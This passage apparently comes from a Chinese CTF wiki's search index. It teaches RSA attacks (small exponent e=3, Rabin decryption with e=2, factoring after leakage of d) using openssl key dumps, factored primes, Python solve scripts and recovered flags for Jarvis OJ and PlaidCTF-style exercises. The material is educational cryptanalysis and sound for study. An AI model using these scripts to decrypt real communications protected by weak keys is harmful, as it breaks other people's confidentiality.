\ne=3\ne=3\n\uff0c\u5f88\u660e\u663e\u662f\u5c0f\u516c\u94a5\u6307\u6570\u653b\u51fb\u4e86\u3002\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528 Crypto \u5e93\u6765\u8bfb\u53d6\u516c\u94a5\uff0c\u4f7f\u7528 multiprocessing \u6765\u52a0\u5feb\u7834\u89e3\u901f\u5ea6\u3002\n\n\n#/usr/bin/python\n\n\n# coding=utf-8\n\n\nimport\n \ngmpy2\n\n\nfrom\n \nCrypto.PublicKey\n \nimport\n \nRSA\n\n\nfrom\n \nmultiprocessing\n \nimport\n \nPool\n\n\npool\n \n=\n \nPool\n(\n4\n)\n\n\n\nwith\n \nopen\n(\n./pubkey.pem\n,\n \nr\n)\n \nas\n \nf\n:\n\n    \nkey\n \n=\n \nRSA\n.\nimportKey\n(\nf\n)\n\n    \nN\n \n=\n \nkey\n.\nn\n\n    \ne\n \n=\n \nkey\n.\ne\n\n\nwith\n \nopen\n(\nflag.enc\n,\n \nr\n)\n \nas\n \nf\n:\n\n    \ncipher\n \n=\n \nf\n.\nread\n()\n.\nencode\n(\nhex\n)\n\n    \ncipher\n \n=\n \nint\n(\ncipher\n,\n \n16\n)\n\n\n\n\ndef\n \ncalc\n(\nj\n):\n\n    \nprint\n \nj\n\n    \na\n,\n \nb\n \n=\n \ngmpy2\n.\niroot\n(\ncipher\n \n+\n \nj\n \n*\n \nN\n,\n \n3\n)\n\n    \nif\n \nb\n \n==\n \n1\n:\n\n        \nm\n \n=\n \na\n\n        \nprint\n \n{:x}\n.\nformat\n(\nint\n(\nm\n))\n.\ndecode\n(\nhex\n)\n\n        \npool\n.\nterminate\n()\n\n        \nexit\n()\n\n\n\n\ndef\n \nSmallE\n():\n\n    \ninputs\n \n=\n \nrange\n(\n0\n,\n \n130000000\n)\n\n    \npool\n.\nmap\n(\ncalc\n,\n \ninputs\n)\n\n    \npool\n.\nclose\n()\n\n    \npool\n.\njoin\n()\n\n\n\n\nif\n \n__name__\n \n==\n \n__main__\n:\n\n    \nprint\n \nstart\n\n    \nSmallE\n()\n\n\n\n\n\n\u7206\u7834\u65f6\u95f4\u6709\u70b9\u957f\uff0c\uff0c\u62ff\u5230 flag\n\n\nDidn\nt you know RSA padding is really important? Now you see a non-padding message is so dangerous. And you should notice this in future.Fl4g: flag{Sm4ll_3xpon3nt_i5_W3ak}\n\n\n\n\n\u9898\u76ee\n\n\nRSA \u884d\u751f\u7b97\u6cd5\u2014\u2014Rabin \u7b97\u6cd5\n\n\n\u653b\u51fb\u6761\u4ef6\n\n\nRabin \u7b97\u6cd5\u7684\u7279\u5f81\u5728\u4e8e \ne=2\ne=2\n\u3002\n\n\n\u653b\u51fb\u539f\u7406\n\n\n\u5bc6\u6587\uff1a\n\n\n\n\n\nc = m^2\\bmod n\n\n\n\n\nc = m^2\\bmod n\n\n\n\n\n\n\u89e3\u5bc6\uff1a\n\n\n\n\n\u8ba1\u7b97\u51fa \nm_p\nm_p\n \u548c \nm_q\nm_q\n\uff1a\n\n\n\n\n\n\n\n\\begin{align*}\nm_p \n= \\sqrt{c} \\bmod p\\\\\nm_q \n= \\sqrt{c} \\bmod q\n\\end{align*}\n\n\n\n\n\\begin{align*}\nm_p &= \\sqrt{c} \\bmod p\\\\\nm_q &= \\sqrt{c} \\bmod q\n\\end{align*}\n\n\n\n\n\n\n\n\u7528\u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u8ba1\u7b97\u51fa \ny_p\ny_p\n \u548c \ny_q\ny_q\n\uff1a\n\n\n\n\n\n\n\ny_p \\cdot p + y_q \\cdot q = 1\n\n\n\n\ny_p \\cdot p + y_q \\cdot q = 1\n\n\n\n\n\n\n\n\u89e3\u51fa\u56db\u4e2a\u660e\u6587\uff1a\n\n\n\n\n\n\n\n\\begin{align*}\na \n= (y_p \\cdot p \\cdot m_q + y_q \\cdot q \\cdot m_p) \\bmod n\\\\\nb \n= n - a\\\\\nc \n= (y_p \\cdot p \\cdot m_q - y_q \\cdot q \\cdot m_p) \\bmod n\\\\\nd \n= n - c\n\\end{align*}\n\n\n\n\n\\begin{align*}\na &= (y_p \\cdot p \\cdot m_q + y_q \\cdot q \\cdot m_p) \\bmod n\\\\\nb &= n - a\\\\\nc &= (y_p \\cdot p \\cdot m_q - y_q \\cdot q \\cdot m_p) \\bmod n\\\\\nd &= n - c\n\\end{align*}\n\n\n\n\n\n\u6ce8\u610f\uff1a\u5982\u679c \np \\equiv q \\equiv 3 \\pmod 4\np \\equiv q \\equiv 3 \\pmod 4\n\uff0c\u5219\n\n\n\n\n\n\\begin{align*}\nm_p \n= c^{\\frac{1}{4}(p + 1)} \\bmod p\\\\\nm_q \n= c^{\\frac{1}{4}(q + 1)} \\bmod q\n\\end{align*}\n\n\n\n\n\\begin{align*}\nm_p &= c^{\\frac{1}{4}(p + 1)} \\bmod p\\\\\nm_q &= c^{\\frac{1}{4}(q + 1)} \\bmod q\n\\end{align*}\n\n\n\n\n\n\u800c\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\np \\equiv q \\equiv 3 \\pmod 4\np \\equiv q \\equiv 3 \\pmod 4\n \u662f\u6ee1\u8db3\u7684\uff0c\u5bf9\u4e8e\u4e0d\u6ee1\u8db3\u7684\u60c5\u51b5\u4e0b\uff0c\u8bf7\u53c2\u8003\u76f8\u5e94\u7684\u7b97\u6cd5\u89e3\u51b3\u3002\n\n\n\u4f8b\u5b50\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5 XMan \u4e00\u671f\u590f\u4ee4\u8425\u8bfe\u5802\u7ec3\u4e60\uff08Jarvis OJ \u6709\u590d\u73b0\uff09\u4e3a\u4f8b\uff0c\u8bfb\u4e00\u4e0b\u516c\u94a5\u3002\n\n\n\u279c  Jarvis OJ-hard RSA git:\n(\nmaster\n)\n \u2717 openssl rsa -pubin -in pubkey.pem -text -modulus \nPublic-Key: \n(\n256\n bit\n)\n\nModulus:\n    \n00\n:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:\n    1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:\n    be:30:dd\nExponent: \n2\n \n(\n0x2\n)\n\n\nModulus\n=\nC2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD\nwriting RSA key\n-----BEGIN PUBLIC KEY-----\nMDowDQYJKoZIhvcNAQEBBQADKQAwJgIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr\nyigb/+l/vjDdAgEC\n-----END PUBLIC KEY-----\n\n\n\n\ne=2\ne=2\n\uff0c\u8003\u8651 Rabin \u7b97\u6cd5\u3002\u9996\u5148\u6211\u4eec\u5148\u5206\u89e3\u4e00\u4e0b p \u548c q\uff0c\u5f97\u5230\n\n\np=275127860351348928173285174381581152299\nq=319576316814478949870590164193048041239\n\n\n\n\n\u7f16\u5199\u4ee3\u7801\n\n\n#!/usr/bin/python\n\n\n# coding=utf-8\n\n\nimport\n \ngmpy2\n\n\nimport\n \nstring\n\n\nfrom\n \nCrypto.PublicKey\n \nimport\n \nRSA\n\n\n\n# \u8bfb\u53d6\u516c\u94a5\u53c2\u6570\n\n\nwith\n \nopen\n(\npubkey.pem\n,\n \nr\n)\n \nas\n \nf\n:\n\n    \nkey\n \n=\n \nRSA\n.\nimportKey\n(\nf\n)\n\n    \nN\n \n=\n \nkey\n.\nn\n\n    \ne\n \n=\n \nkey\n.\ne\n\n\nwith\n \nopen\n(\nflag.enc\n,\n \nr\n)\n \nas\n \nf\n:\n\n    \ncipher\n \n=\n \nf\n.\nread\n()\n.\nencode\n(\nhex\n)\n\n    \ncipher\n \n=\n \nstring\n.\natoi\n(\ncipher\n,\n \nbase\n=\n16\n)\n\n    \n# print cipher\n\n\nprint\n \nplease input p\n\n\np\n \n=\n \nint\n(\nraw_input\n(),\n \n10\n)\n\n\nprint\n \nplease input q\n\n\nq\n \n=\n \nint\n(\nraw_input\n(),\n \n10\n)\n\n\n# \u8ba1\u7b97yp\u548cyq\n\n\ninv_p\n \n=\n \ngmpy2\n.\ninvert\n(\np\n,\n \nq\n)\n\n\ninv_q\n \n=\n \ngmpy2\n.\ninvert\n(\nq\n,\n \np\n)\n\n\n\n# \u8ba1\u7b97mp\u548cmq\n\n\nmp\n \n=\n \npow\n(\ncipher\n,\n \n(\np\n \n+\n \n1\n)\n \n/\n \n4\n,\n \np\n)\n\n\nmq\n \n=\n \npow\n(\ncipher\n,\n \n(\nq\n \n+\n \n1\n)\n \n/\n \n4\n,\n \nq\n)\n\n\n\n# \u8ba1\u7b97a,b,c,d\n\n\na\n \n=\n \n(\ninv_p\n \n*\n \np\n \n*\n \nmq\n \n+\n \ninv_q\n \n*\n \nq\n \n*\n \nmp\n)\n \n%\n \nN\n\n\nb\n \n=\n \nN\n \n-\n \nint\n(\na\n)\n\n\nc\n \n=\n \n(\ninv_p\n \n*\n \np\n \n*\n \nmq\n \n-\n \ninv_q\n \n*\n \nq\n \n*\n \nmp\n)\n \n%\n \nN\n\n\nd\n \n=\n \nN\n \n-\n \nint\n(\nc\n)\n\n\n\nfor\n \ni\n \nin\n \n(\na\n,\n \nb\n,\n \nc\n,\n \nd\n):\n\n    \ns\n \n=\n \n%x\n \n%\n \ni\n\n    \nif\n \nlen\n(\ns\n)\n \n%\n \n2\n \n!=\n \n0\n:\n\n        \ns\n \n=\n \n0\n \n+\n \ns\n\n    \nprint\n \ns\n.\ndecode\n(\nhex\n)\n\n\n\n\n\n\u62ff\u5230 flag\uff0c\nPCTF{sp3ci4l_rsa}\n\u3002\n\n\n\u9898\u76ee", 
            "title": "\u516c\u94a5\u6307\u6570\u76f8\u5173\u653b\u51fb"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_e_attack/#_1", 
            "text": "", 
            "title": "\u5c0f\u516c\u94a5\u6307\u6570\u653b\u51fb"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_e_attack/#_2", 
            "text": "e \u7279\u522b\u5c0f\uff0c\u6bd4\u5982 e \u4e3a 3\u3002", 
            "title": "\u653b\u51fb\u6761\u4ef6"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_e_attack/#_3", 
            "text": "\u5047\u8bbe\u7528\u6237\u4f7f\u7528\u7684\u5bc6\u94a5  e=3 e=3 \u3002\u8003\u8651\u5230\u52a0\u5bc6\u5173\u7cfb\u6ee1\u8db3\uff1a   \nc\\equiv m^3 \\bmod N  \nc\\equiv m^3 \\bmod N   \u5219\uff1a   \n\\begin{align*}\nm^3  = c+k\\times N\\\\\nm  = \\sqrt[3]{c+k\\times n}\n\\end{align*}  \n\\begin{align*}\nm^3 &= c+k\\times N\\\\\nm &= \\sqrt[3]{c+k\\times n}\n\\end{align*}   \u653b\u51fb\u8005\u53ef\u4ee5\u4ece\u5c0f\u5230\u5927\u679a\u4e3e  N N \uff0c\u4f9d\u6b21\u5f00\u4e09\u6b21\u6839\uff0c\u76f4\u5230\u5f00\u51fa\u6574\u6570\u4e3a\u6b62\u3002", 
            "title": "\u653b\u51fb\u539f\u7406"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_e_attack/#_4", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee5 XMan \u4e00\u671f\u590f\u4ee4\u8425\u8bfe\u5802\u7ec3\u4e60\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff08Jarvis OJ \u6709\u590d\u73b0\uff09\uff0c\u9644\u4ef6\u4e2d\u6709\u4e00\u4e2a  flag.enc  \u548c  pubkey.pem \uff0c\u5f88\u660e\u663e\u662f\u5bc6\u6587\u548c\u516c\u94a5\u4e86\uff0c\u5148\u7528  openssl  \u8bfb\u4e00\u4e0b\u516c\u94a5\u3002  \u279c  Jarvis OJ-Extremely hard RSA git: ( master )  \u2717 openssl rsa -pubin -in pubkey.pem -text -modulus       \nPublic-Key:  ( 4096  bit ) \nModulus:\n     00 :b0:be:e5:e3:e9:e5:a7:e8:d0:0b:49:33:55:c6:\n     18 :fc:8c:7d:7d:03:b8:2e:40:99:51:c1:82:f3:98:\n    de:e3:10:45:80:e7:ba:70:d3:83:ae:53:11:47:56:\n     56 :e8:a9:64:d3:80:cb:15:7f:48:c9:51:ad:fa:65:\n    db:0b:12:2c:a4:0e:42:fa:70:91:89:b7:19:a4:f0:\n    d7:46:e2:f6:06:9b:af:11:ce:bd:65:0f:14:b9:3c:\n     97 :73:52:fd:13:b1:ee:a6:d6:e1:da:77:55:02:ab:\n    ff:89:d3:a8:b3:61:5f:d0:db:49:b8:8a:97:6b:c2:\n     05 :68:48:92:84:e1:81:f6:f1:1e:27:08:91:c8:ef:\n     80 :01:7b:ad:23:8e:36:30:39:a4:58:47:0f:17:49:\n     10 :1b:c2:99:49:d3:a4:f4:03:8d:46:39:38:85:15:\n     79 :c7:52:5a:69:98:4f:15:b5:66:7f:34:20:9b:70:\n    eb:26:11:36:94:7f:a1:23:e5:49:df:ff:00:60:18:\n     83 :af:d9:36:fe:41:1e:00:6e:4e:93:d1:a0:0b:0f:\n    ea:54:1b:bf:c8:c5:18:6c:b6:22:05:03:a9:4b:24:\n     13 :11:0d:64:0c:77:ea:54:ba:32:20:fc:8f:4c:c6:\n    ce:77:15:1e:29:b3:e0:65:78:c4:78:bd:1b:eb:e0:\n     45 :89:ef:9a:19:7f:6f:80:6d:b8:b3:ec:d8:26:ca:\n    d2:4f:53:24:cc:de:c6:e8:fe:ad:2c:21:50:06:86:\n     02 :c8:dc:dc:59:40:2c:ca:c9:42:4b:79:00:48:cc:\n    dd:93:27:06:80:95:ef:a0:10:b7:f1:96:c7:4b:a8:\n    c3:7b:12:8f:9e:14:11:75:16:33:f7:8b:7b:9e:56:\n    f7:1f:77:a1:b4:da:ad:3f:c5:4b:5e:7e:f9:35:d9:\n    a7:2f:b1:76:75:97:65:52:2b:4b:bc:02:e3:14:d5:\n    c0:6b:64:d5:05:4b:7b:09:6c:60:12:36:e6:cc:f4:\n    5b:5e:61:1c:80:5d:33:5d:ba:b0:c3:5d:22:6c:c2:\n     08 :d8:ce:47:36:ba:39:a0:35:44:26:fa:e0:06:c7:\n    fe:52:d5:26:7d:cf:b9:c3:88:4f:51:fd:df:df:4a:\n     97 :94:bc:fe:0e:15:57:11:37:49:e6:c8:ef:42:1d:\n    ba:26:3a:ff:68:73:9c:e0:0e:d8:0f:d0:02:2e:f9:\n    2d:34:88:f7:6d:eb:62:bd:ef:7b:ea:60:26:f2:2a:\n    1d:25:aa:2a:92:d1:24:41:4a:80:21:fe:0c:17:4b:\n     98 :03:e6:bb:5f:ad:75:e1:86:a9:46:a1:72:80:77:\n    0f:12:43:f4:38:74:46:cc:ce:b2:22:2a:96:5c:c3:\n    0b:39:29\nExponent:  3   ( 0x3 )  Modulus = B0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929\nwriting RSA key\n-----BEGIN PUBLIC KEY-----\nMIICIDANBgkqhkiG9w0BAQEFAAOCAg0AMIICCAKCAgEAsL7l4+nlp+jQC0kzVcYY\n/Ix9fQO4LkCZUcGC85je4xBFgOe6cNODrlMRR1ZW6Klk04DLFX9IyVGt+mXbCxIs\npA5C+nCRibcZpPDXRuL2BpuvEc69ZQ8UuTyXc1L9E7Huptbh2ndVAqv/idOos2Ff\n0NtJuIqXa8IFaEiShOGB9vEeJwiRyO+AAXutI442MDmkWEcPF0kQG8KZSdOk9AON\nRjk4hRV5x1JaaZhPFbVmfzQgm3DrJhE2lH+hI+VJ3/8AYBiDr9k2/kEeAG5Ok9Gg\nCw/qVBu/yMUYbLYiBQOpSyQTEQ1kDHfqVLoyIPyPTMbOdxUeKbPgZXjEeL0b6+BF\nie+aGX9vgG24s+zYJsrST1MkzN7G6P6tLCFQBoYCyNzcWUAsyslCS3kASMzdkycG\ngJXvoBC38ZbHS6jDexKPnhQRdRYz94t7nlb3H3ehtNqtP8VLXn75NdmnL7F2dZdl\nUitLvALjFNXAa2TVBUt7CWxgEjbmzPRbXmEcgF0zXbqww10ibMII2M5HNro5oDVE\nJvrgBsf+UtUmfc+5w4hPUf3f30qXlLz+DhVXETdJ5sjvQh26Jjr/aHOc4A7YD9AC\nLvktNIj3betive976mAm8iodJaoqktEkQUqAIf4MF0uYA+a7X6114YapRqFygHcP EkP0OHRGzM6yIiqWXMMLOSkCAQM = \n-----END PUBLIC KEY-----  \u770b\u5230  e=3 e=3 \uff0c\u5f88\u660e\u663e\u662f\u5c0f\u516c\u94a5\u6307\u6570\u653b\u51fb\u4e86\u3002\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528 Crypto \u5e93\u6765\u8bfb\u53d6\u516c\u94a5\uff0c\u4f7f\u7528 multiprocessing \u6765\u52a0\u5feb\u7834\u89e3\u901f\u5ea6\u3002  #/usr/bin/python  # coding=utf-8  import   gmpy2  from   Crypto.PublicKey   import   RSA  from   multiprocessing   import   Pool  pool   =   Pool ( 4 )  with   open ( ./pubkey.pem ,   r )   as   f : \n     key   =   RSA . importKey ( f ) \n     N   =   key . n \n     e   =   key . e  with   open ( flag.enc ,   r )   as   f : \n     cipher   =   f . read () . encode ( hex ) \n     cipher   =   int ( cipher ,   16 )  def   calc ( j ): \n     print   j \n     a ,   b   =   gmpy2 . iroot ( cipher   +   j   *   N ,   3 ) \n     if   b   ==   1 : \n         m   =   a \n         print   {:x} . format ( int ( m )) . decode ( hex ) \n         pool . terminate () \n         exit ()  def   SmallE (): \n     inputs   =   range ( 0 ,   130000000 ) \n     pool . map ( calc ,   inputs ) \n     pool . close () \n     pool . join ()  if   __name__   ==   __main__ : \n     print   start \n     SmallE ()   \u7206\u7834\u65f6\u95f4\u6709\u70b9\u957f\uff0c\uff0c\u62ff\u5230 flag  Didn t you know RSA padding is really important? Now you see a non-padding message is so dangerous. And you should notice this in future.Fl4g: flag{Sm4ll_3xpon3nt_i5_W3ak}", 
            "title": "\u8303\u4f8b"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_e_attack/#_5", 
            "text": "", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_e_attack/#rsa-rabin", 
            "text": "", 
            "title": "RSA \u884d\u751f\u7b97\u6cd5\u2014\u2014Rabin \u7b97\u6cd5"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_e_attack/#_6", 
            "text": "Rabin \u7b97\u6cd5\u7684\u7279\u5f81\u5728\u4e8e  e=2 e=2 \u3002", 
            "title": "\u653b\u51fb\u6761\u4ef6"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_e_attack/#_7", 
            "text": "\u5bc6\u6587\uff1a   \nc = m^2\\bmod n  \nc = m^2\\bmod n   \u89e3\u5bc6\uff1a   \u8ba1\u7b97\u51fa  m_p m_p  \u548c  m_q m_q \uff1a    \n\\begin{align*}\nm_p  = \\sqrt{c} \\bmod p\\\\\nm_q  = \\sqrt{c} \\bmod q\n\\end{align*}  \n\\begin{align*}\nm_p &= \\sqrt{c} \\bmod p\\\\\nm_q &= \\sqrt{c} \\bmod q\n\\end{align*}    \u7528\u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u8ba1\u7b97\u51fa  y_p y_p  \u548c  y_q y_q \uff1a    \ny_p \\cdot p + y_q \\cdot q = 1  \ny_p \\cdot p + y_q \\cdot q = 1    \u89e3\u51fa\u56db\u4e2a\u660e\u6587\uff1a    \n\\begin{align*}\na  = (y_p \\cdot p \\cdot m_q + y_q \\cdot q \\cdot m_p) \\bmod n\\\\\nb  = n - a\\\\\nc  = (y_p \\cdot p \\cdot m_q - y_q \\cdot q \\cdot m_p) \\bmod n\\\\\nd  = n - c\n\\end{align*}  \n\\begin{align*}\na &= (y_p \\cdot p \\cdot m_q + y_q \\cdot q \\cdot m_p) \\bmod n\\\\\nb &= n - a\\\\\nc &= (y_p \\cdot p \\cdot m_q - y_q \\cdot q \\cdot m_p) \\bmod n\\\\\nd &= n - c\n\\end{align*}   \u6ce8\u610f\uff1a\u5982\u679c  p \\equiv q \\equiv 3 \\pmod 4 p \\equiv q \\equiv 3 \\pmod 4 \uff0c\u5219   \n\\begin{align*}\nm_p  = c^{\\frac{1}{4}(p + 1)} \\bmod p\\\\\nm_q  = c^{\\frac{1}{4}(q + 1)} \\bmod q\n\\end{align*}  \n\\begin{align*}\nm_p &= c^{\\frac{1}{4}(p + 1)} \\bmod p\\\\\nm_q &= c^{\\frac{1}{4}(q + 1)} \\bmod q\n\\end{align*}   \u800c\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c p \\equiv q \\equiv 3 \\pmod 4 p \\equiv q \\equiv 3 \\pmod 4  \u662f\u6ee1\u8db3\u7684\uff0c\u5bf9\u4e8e\u4e0d\u6ee1\u8db3\u7684\u60c5\u51b5\u4e0b\uff0c\u8bf7\u53c2\u8003\u76f8\u5e94\u7684\u7b97\u6cd5\u89e3\u51b3\u3002", 
            "title": "\u653b\u51fb\u539f\u7406"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_e_attack/#_8", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee5 XMan \u4e00\u671f\u590f\u4ee4\u8425\u8bfe\u5802\u7ec3\u4e60\uff08Jarvis OJ \u6709\u590d\u73b0\uff09\u4e3a\u4f8b\uff0c\u8bfb\u4e00\u4e0b\u516c\u94a5\u3002  \u279c  Jarvis OJ-hard RSA git: ( master )  \u2717 openssl rsa -pubin -in pubkey.pem -text -modulus \nPublic-Key:  ( 256  bit ) \nModulus:\n     00 :c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:\n    1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:\n    be:30:dd\nExponent:  2   ( 0x2 )  Modulus = C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD\nwriting RSA key\n-----BEGIN PUBLIC KEY-----\nMDowDQYJKoZIhvcNAQEBBQADKQAwJgIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr\nyigb/+l/vjDdAgEC\n-----END PUBLIC KEY-----  e=2 e=2 \uff0c\u8003\u8651 Rabin \u7b97\u6cd5\u3002\u9996\u5148\u6211\u4eec\u5148\u5206\u89e3\u4e00\u4e0b p \u548c q\uff0c\u5f97\u5230  p=275127860351348928173285174381581152299\nq=319576316814478949870590164193048041239  \u7f16\u5199\u4ee3\u7801  #!/usr/bin/python  # coding=utf-8  import   gmpy2  import   string  from   Crypto.PublicKey   import   RSA  # \u8bfb\u53d6\u516c\u94a5\u53c2\u6570  with   open ( pubkey.pem ,   r )   as   f : \n     key   =   RSA . importKey ( f ) \n     N   =   key . n \n     e   =   key . e  with   open ( flag.enc ,   r )   as   f : \n     cipher   =   f . read () . encode ( hex ) \n     cipher   =   string . atoi ( cipher ,   base = 16 ) \n     # print cipher  print   please input p  p   =   int ( raw_input (),   10 )  print   please input q  q   =   int ( raw_input (),   10 )  # \u8ba1\u7b97yp\u548cyq  inv_p   =   gmpy2 . invert ( p ,   q )  inv_q   =   gmpy2 . invert ( q ,   p )  # \u8ba1\u7b97mp\u548cmq  mp   =   pow ( cipher ,   ( p   +   1 )   /   4 ,   p )  mq   =   pow ( cipher ,   ( q   +   1 )   /   4 ,   q )  # \u8ba1\u7b97a,b,c,d  a   =   ( inv_p   *   p   *   mq   +   inv_q   *   q   *   mp )   %   N  b   =   N   -   int ( a )  c   =   ( inv_p   *   p   *   mq   -   inv_q   *   q   *   mp )   %   N  d   =   N   -   int ( c )  for   i   in   ( a ,   b ,   c ,   d ): \n     s   =   %x   %   i \n     if   len ( s )   %   2   !=   0 : \n         s   =   0   +   s \n     print   s . decode ( hex )   \u62ff\u5230 flag\uff0c PCTF{sp3ci4l_rsa} \u3002", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_e_attack/#_9", 
            "text": "", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/crypto/asymmetric/rsa/rsa_d_attack/", 
            "text": "d \u6cc4\u9732\u653b\u51fb\n\n\n\u653b\u51fb\u539f\u7406\n\n\n\u9996\u5148\u5f53 d \u6cc4\u9732\u4e4b\u540e\uff0c\u6211\u4eec\u81ea\u7136\u53ef\u4ee5\u89e3\u5bc6\u6240\u6709\u52a0\u5bc6\u7684\u6d88\u606f\u3002\u6211\u4eec\u751a\u81f3\u8fd8\u53ef\u4ee5\u5bf9\u6a21\u6570 N \u8fdb\u884c\u5206\u89e3\u3002\u5176\u57fa\u672c\u539f\u7406\u5982\u4e0b\n\n\n\u6211\u4eec\u77e5\u9053 \ned \\equiv 1 \\bmod \\varphi(n)\ned \\equiv 1 \\bmod \\varphi(n)\n\uff0c\u90a3\u4e48 \n\\varphi(n) | k=ed-1\n\\varphi(n) | k=ed-1\n\u3002\u663e\u7136 k \u662f\u4e00\u4e2a\u5076\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u4ee4 \nk=2^tr\nk=2^tr\n\uff0c\u5176\u4e2d r \u4e3a\u5947\u6570\uff0ct \u4e0d\u5c0f\u4e8e 1\u3002\u90a3\u4e48\u5bf9\u4e8e\u4efb\u4f55\u7684\u4e0e N \u4e92\u7d20\u7684\u6570 g\uff0c\u6211\u4eec\u90fd\u6709 \ng^k \\equiv 1 \\bmod n\ng^k \\equiv 1 \\bmod n\n\u3002\u90a3\u4e48 \nz=g^{\\frac{k}{2}}\nz=g^{\\frac{k}{2}}\n \u662f\u6a21 N \u7684\u4e8c\u6b21\u65b9\u6839\u3002\u90a3\u4e48\u6211\u4eec\u6709\n\n\n\n\n\nz^2 \\equiv 1 \\bmod p \\\\\nz^2 \\equiv 1 \\bmod q\n\n\n\n\nz^2 \\equiv 1 \\bmod p \\\\\nz^2 \\equiv 1 \\bmod q\n\n\n\n\n\n\u8fdb\u800c\u6211\u4eec\u6211\u4eec\u77e5\u9053\u65b9\u7a0b\u6709\u4ee5\u4e0b\u56db\u4e2a\u89e3\uff0c\u524d\u4e24\u4e2a\u662f\n\n\n\n\n\nx \\equiv \\pm1 \\bmod N\n\n\n\n\nx \\equiv \\pm1 \\bmod N\n\n\n\n\n\n\u540e\u4e24\u4e2a\u662f \n\\pm x\n\\pm x\n\uff0c\u5176\u4e2d x \u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6\n\n\n\n\n\nx \\equiv 1 \\bmod p \\\\\nx \\equiv -1 \\bmod q\n\n\n\n\nx \\equiv 1 \\bmod p \\\\\nx \\equiv -1 \\bmod q\n\n\n\n\n\n\u663e\u7136\uff0c\nz=g^{\\frac{k}{2}}\nz=g^{\\frac{k}{2}}\n \u6ee1\u8db3\u7684\u662f\u540e\u9762\u90a3\u4e2a\u6761\u4ef6\uff0c\u6211\u4eec\u53ef\u4ee5\u8ba1\u7b97 \ngcd(z-1,N)\ngcd(z-1,N)\n \u6765\u5bf9 N \u8fdb\u884c\u5206\u89e3\u3002\n\n\n\u5de5\u5177\n\n\n\u5229\u7528\u4ee5\u4e0b\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u8ba1\u7b97\n\n\n\n\nRsaConverter.exe (\nhttps://sourceforge.net/projects/rsaconverter/\n , for windows )\n\n\nrsatool.py\n\n\n\n\n2017 HITB - hack in the card II\n\n\n\n\nThe second smart card sent to us has been added some countermeasures by that evil company. They also changed the public key(attachments -\n publickey.pem). However it seems that they missed something......\n\nCan you decrypt the following hex-encoded ciphertext this time?\n\n\n016d1d26a470fad51d52e5f3e90075ab77df69d2fb39905fe634ded81d10a5fd10c35e1277035a9efabb66e4d52fd2d1eaa845a93a4e0f1c4a4b70a0509342053728e89e977cfb9920d5150393fe9dcbf86bc63914166546d5ae04d83631594703db59a628de3b945f566bdc5f0ca7bdfa819a0a3d7248286154a6cc5199b99708423d0749d4e67801dff2378561dd3b0f10c8269dbef2630819236e9b0b3d3d8910f7f7afbbed29788e965a732efc05aef3194cd1f1cff97381107f2950c935980e8954f91ed2a653c91015abea2447ee2a3488a49cc9181a3b1d44f198ff9f0141badcae6a9ae45c6c75816836fb5f331c7f2eb784129a142f88b4dc22a0a977\n\n\n\n\n\n\u8fd9\u9898\u662f\u63a5\u7eed 2017 HITB - hack in the card I \u7684\u4e00\u9053\u9898\uff0c\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 \nopenssl\n \u67e5\u770b \npublickey.pem\n 